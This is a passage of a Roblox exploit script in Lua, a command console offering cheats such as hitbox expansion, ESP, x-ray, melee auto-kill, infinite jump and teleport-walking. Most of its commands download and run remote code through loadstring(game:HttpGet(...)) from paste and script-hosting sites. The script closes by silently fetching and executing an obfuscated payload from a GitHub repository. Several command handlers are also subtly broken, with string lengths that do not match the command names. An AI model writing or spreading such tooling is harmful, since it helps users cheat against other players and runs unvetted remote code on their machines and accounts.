                result = "NamelessAdminIsActive:\n"
            end
        elseif command:sub(1, 15) == "na" then
            local luaCode = command:sub(16)
            local func, err = loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-Admin-Official-15022"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "NamelessAdminIsActive:\n"
            end
        elseif command:sub(1, 15) == "namelessadminv2" then
            local luaCode = command:sub(16)
            local func, err = loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-admin-14114"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "NamelessAdminV2IsActive:\n"
            end
        elseif command:sub(1, 15) == "nav2" then
            local luaCode = command:sub(16)
            local func, err = loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-admin-14114"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "NamelessAdminV2IsActive:\n"
            end
        elseif command:sub(1, 15) == "jerkoff" then
            local luaCode = command:sub(16)
            local func, err = loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "JerkTool:\nWhat can go wrong"
            end
        elseif command:sub(1, 15) == "telekinesis" then
            local luaCode = command:sub(16)
            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Control-part/refs/heads/main/CP"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "TelekinesisIsActive:\n"
            end
        elseif command:sub(1, 15) == "tk" then
            local luaCode = command:sub(16)
            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Control-part/refs/heads/main/CP"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "TelekinesisIsActive:\n"
            end
        elseif command:sub(1, 15) == "meleekill" then
            local luaCode = command:sub(19)
            local func, err = ItemTpOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Kill Players With Sword or other (req, melee):\n"
            end
        elseif command:sub(1, 15) == "stopmeleekill" then
            local luaCode = command:sub(19)
            local func, err = ItemTpOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Stopped meleekill (Client):\n"
            end
        elseif command:sub(1, 15) == "mk" then
            local luaCode = command:sub(19)
            local func, err = ItemTpOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Kill Players With Sword or other (req, melee):\n"
            end
        elseif command:sub(1, 15) == "smk" then
            local luaCode = command:sub(19)
            local func, err = ItemTpOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Stopped meleekill:\n"
            end
        elseif command:sub(1, 7) == "hitbox " then
            local size = tonumber(command:sub(8)) -- Get size from command
            if size and size > 0 then
                for _, player in pairs(game.Players:GetPlayers()) do
                    if player ~= game.Players.LocalPlayer then -- Check added here
                        local character = player.Character
                        if character and character:FindFirstChild("HumanoidRootPart") then
                            local hrp = character.HumanoidRootPart
                            hrp.Size = Vector3.new(size, size, size) -- Expand HRP
                            hrp.Transparency = 0.89 -- Almost visible
                        end
                    end
                end
                result = "Hitbox expanded to size: " .. size
            else
                result = "Invalid size. Use: hitbox [size]"
            end
        elseif command:sub(1, 13) == "f3x" then
            local luaCode = command:sub(14)
            local func, err = loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "GetGear rbxassetid://6695644299:\nF3X is active"
            end
        elseif command:sub(1, 13) == "winobby" then
            local luaCode = command:sub(14)
            local func, err = TPCheckpoints()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Finished Obby:\nMay Not Work On Some (Games)"
            end
        elseif command:sub(1, 13) == "fex" then
            local luaCode = command:sub(14)
            local func, err = loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "GetGear rbxassetid://6695644299:\nF3X is active"
            end
        elseif command:sub(1, 13) == "esp" then
            local luaCode = command:sub(14)
            local func, err = EspOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "EspIsEnabled:\nEsp On"
            end
        elseif command:sub(1, 13) == "unesp" then
            local luaCode = command:sub(14)
            local func, err = EspOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "EspIsDisabled:\nEsp Off"
            end
        elseif command:sub(1, 5) == "grav " then
            local grav = tonumber(command:sub(6))
            if grav and grav > 0 then
                workspace.Gravity = grav
                result = "Gravity set to "..grav
            else
                result = "Invalid gravity. Use: grav [number]"
            end
        elseif command:sub(1, 8) == "infjump" then
            local infiniteJumpEnabled = not _G.infiniteJumpEnabled
            _G.infiniteJumpEnabled = infiniteJumpEnabled
    
            if infiniteJumpEnabled then
                game:GetService("UserInputService").JumpRequest:Connect(function()
                    game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
                end)
                result = "Infinite jump enabled"
            else
                result = "Infinite jump disabled"
            end
        elseif command == "stoptpwalk" then
            if tpwalking then
                StopTpWalk()
                result = "TP Walk disabled."
            else
                StopTpWalk()
                result = "TP Walk Disabled"
            end
        elseif command == "stpw" then
            if tpwalking then
                StopTpWalk()
                result = "TP Walk disabled."
            else
                StopTpWalk()
                result = "TP Walk Disabled"
            end
        elseif command == "tpwalk" then
            if tpwalking then
                StopTpWalk()
                result = "TP Walk disabled."
            else
                StartTpWalk()
                result = "TP Walk enabled."
            end
        elseif command == "tpw" then
            if tpwalking then
                StopTpWalk()
                result = "TP Walk disabled."
            else
                StartTpWalk()
                result = "TP Walk Enabled."
            end
        elseif command:lower():find("^tpws ") or command:lower():find("^tpwalkspeed ") then
            local speed = tonumber(command:match("%d+"))
            if speed and speed > 0 then
                tpSpeed = speed
                result = "TP Speed set to " .. speed
            else
                result = "Invalid speed (use numbers > 0)"
            end
        elseif command == "xray" then
            enableXRay()
            result = "XRay enabled."
        elseif command == "unxray" then
            disableXRay()
            result = "XRay disabled."
        end

        -- Add the result to the output
        outputText.Text = outputText.Text .. "\n" .. result

        -- Auto-scroll to the bottom
        outputFrame.CanvasPosition = Vector2.new(0, outputText.TextBounds.Y)
    end

    -- Connect the input box to the handleInput function
    inputBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            handleInput(inputBox)
        end
    end)

    -- Allow the user to press Enter to submit the command
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.Return and inputBox:IsFocused() then
            handleInput(inputBox)
        end
    end)
    
    -- Dragging functionality
    local gui = mainFrame -- Change this to the UI element you want to make draggable

    local dragging
    local dragStart
    local startPos
    local lastMousePos
    local lastGoalPos
    local DRAG_SPEED = 8 -- Adjust for smoother or faster dragging

    local function Lerp(a, b, m)
        return a + (b - a) * m
    end

    local function Update(dt)
        if not startPos then return end
        if not dragging and lastGoalPos then
            gui.Position = UDim2.new(
                startPos.X.Scale,
                Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED),
                startPos.Y.Scale,
                Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED)
            )
            return
        end

        local delta = lastMousePos - UserInputService:GetMouseLocation()
        local xGoal = startPos.X.Offset - delta.X
        local yGoal = startPos.Y.Offset - delta.Y
        lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)

        gui.Position = UDim2.new(
            startPos.X.Scale,
            Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED),
            startPos.Y.Scale,
            Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED)
        )
    end

    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position
            lastMousePos = UserInputService:GetMouseLocation()

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    RunService.Heartbeat:Connect(Update)

    print("Script completed")
end

    -- Initial UI creation
    createUI()

    -- Destroy UI when the player dies
    player.CharacterRemoving:Connect(destroyUI)

    -- Recreate UI when the player respawns
    player.CharacterAdded:Connect(createUI)
end)
end)

if not success then
    warn("Error caught:", err) -- Prevents full error log spam
    createNotification("⚠️ Error Caught: " .. err, 5, "rbxassetid://1234567890") -- Replace with an appropriate image asset ID
end
end)
wait()
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Credit-obfuscated-lol/refs/heads/main/OBFCredit", true))()
end)
